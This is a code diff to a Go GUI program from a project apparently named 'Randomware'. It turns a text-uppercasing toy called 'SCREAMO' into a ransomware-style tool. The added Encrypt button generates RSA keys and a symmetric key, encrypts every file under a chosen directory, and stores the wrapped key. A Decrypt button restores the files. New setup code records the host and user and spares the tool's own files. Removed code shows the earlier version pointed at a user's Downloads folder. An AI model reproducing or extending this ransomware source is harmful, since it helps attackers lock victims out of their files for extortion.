@@ -1,7 +1,15 @@
 package main
 
 import (
-	"strings"
+	"Randomware/encryption"
+	"Randomware/encryption/keys"
+	"Randomware/file"
+	"fmt"
+	"log"
+	"os"
+	"os/user"
+	"path/filepath"
+	"strconv"
 
 	"github.com/lxn/walk"
 	. "github.com/lxn/walk/declarative"
@@ -13,44 +21,39 @@ const PubKeyFile string = "rsa_public_key.pub"
 // PrivKeyFile : is the private key file name
 const PrivKeyFile string = "rsa_private_key.priv"
 
-func main() {
-	/* if false {
-		//File Encryption
-		privateKey, publicKey := keys.GenerateKeyPair(4096)
-		file.BytesToNewFile(PubKeyFile, keys.PublicKeyToBytes(publicKey))
-		file.BytesToNewFile(PrivKeyFile, keys.PrivateKeyToBytes(privateKey))
-		//Encrypt file
-		var key *[]byte
-		key = encryption.GenKey()
-		file.BytesToNewFile("safe_key", keys.EncryptWithPublicKey(key, publicKey))
-		nbrFiles, err := file.EncryptAll("C:\\Users\\peter\\Downloads", key)
-		if err != nil {
-			log.Fatal(err)
-		}
+// EncryptedKeyFile : is the encrypted key file
+const EncryptedKeyFile string = "safe_key"
 
-		fmt.Println("Encrypted files number: ", nbrFiles)
+// setEnv : initializes the environment variables
+func setEnv() {
+	user, err := user.Current()
+	if err != nil {
+		log.Fatal(err)
+	}
+
+	file.HostName, err = os.Hostname()
+
+	if err != nil {
+		file.HostName = ".BAD-PC"
 	} else {
-		//File Decryption
-		encryptedKey, err := file.BytesFromFile("safe_key")
-		if err != nil {
-			log.Fatal(err)
-		}
-		privateKeyBytes, err := file.BytesFromFile(PrivKeyFile)
-		if err != nil {
-			log.Fatal(err)
-		}
-		privateKey := keys.BytesToPrivateKey(privateKeyBytes)
-		var key *[]byte
-		key = keys.DecryptWithPrivateKey(encryptedKey, privateKey)
-		nbrFiles, err := file.DecryptAll("C:\\Users\\peter\\Downloads", key)
-		if err != nil {
-			log.Fatal(err)
-		}
+		file.HostName = "." + file.HostName
+	}
 
-		fmt.Println("Decrypted files number: ", nbrFiles)
-	} */
+	exePath, err := os.Executable()
 
+	if err != nil {
+		log.Fatal(err)
+	}
+
+	exeDir := filepath.Dir(exePath) + "\\"
+	file.SafeFiles = []string{exePath, exeDir + PubKeyFile, exeDir + PrivKeyFile, exeDir + EncryptedKeyFile}
+
+	fmt.Println(user.HomeDir, " ", user.Username, " ", file.HostName, " ", file.SafeFiles)
+}
+
+func main() {
 	var inTE, outTE *walk.TextEdit
+	setEnv()
 
 	MainWindow{
 		Title:   "SCREAMO",
@@ -64,9 +67,43 @@ func main() {
 				},
 			},
 			PushButton{
-				Text: "SCREAM",
+				Text: "Encrypt",
 				OnClicked: func() {
-					outTE.SetText(strings.ToUpper(inTE.Text()))
+					//File Encryption
+					privateKey, publicKey := keys.GenerateKeyPair(4096)
+					file.BytesToNewFile(PubKeyFile, keys.PublicKeyToBytes(publicKey))
+					file.BytesToNewFile(PrivKeyFile, keys.PrivateKeyToBytes(privateKey))
+					//Encrypt file
+					var key *[]byte
+					key = encryption.GenKey()
+					file.BytesToNewFile(EncryptedKeyFile, keys.EncryptWithPublicKey(key, publicKey))
+					nbrFiles, err := file.EncryptAll(inTE.Text(), key)
+					if err != nil {
+						log.Fatal(err)
+					}
+					outTE.SetText("Encrypted files number: " + strconv.Itoa(int(nbrFiles)))
+				},
+			},
+			PushButton{
+				Text: "Decrypt",
+				OnClicked: func() {
+					//File Decryption
+					encryptedKey, err := file.BytesFromFile(EncryptedKeyFile)
+					if err != nil {
+						log.Fatal(err)
+					}
+					privateKeyBytes, err := file.BytesFromFile(PrivKeyFile)
+					if err != nil {
+						log.Fatal(err)
+					}
+					privateKey := keys.BytesToPrivateKey(privateKeyBytes)
+					var key *[]byte
+					key = keys.DecryptWithPrivateKey(encryptedKey, privateKey)
+					nbrFiles, err := file.DecryptAll(inTE.Text(), key)
+					if err != nil {
+						log.Fatal(err)
+					}
+					outTE.SetText("Decrypted files number: " + strconv.Itoa(int(nbrFiles)))
 				},
 			},
 		},
